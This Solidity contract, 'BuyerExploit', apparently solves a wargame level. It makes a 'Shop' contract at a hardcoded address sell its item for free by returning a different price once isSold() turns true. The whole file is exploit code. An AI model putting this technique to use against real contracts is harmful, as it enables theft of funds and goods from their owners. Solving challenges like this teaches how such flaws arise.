// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BuyerExploit {
  
  Shop targetContract = Shop(address(0x638A861FCf4E001fe76436D8121D416B7bAE29C6));

  function price() external view returns (uint) {
      //First time I gotta return that value, second time I got to recall another value
      if(!targetContract.isSold()){
          return targetContract.price();
      }
      else{
          return 0;
      }
      
  }

  function buyForFree() public{
      targetContract.buy();
  }


}

interface Shop {
  function buy() external;
  function price() external view returns (uint);
  function isSold() external view returns (bool);
}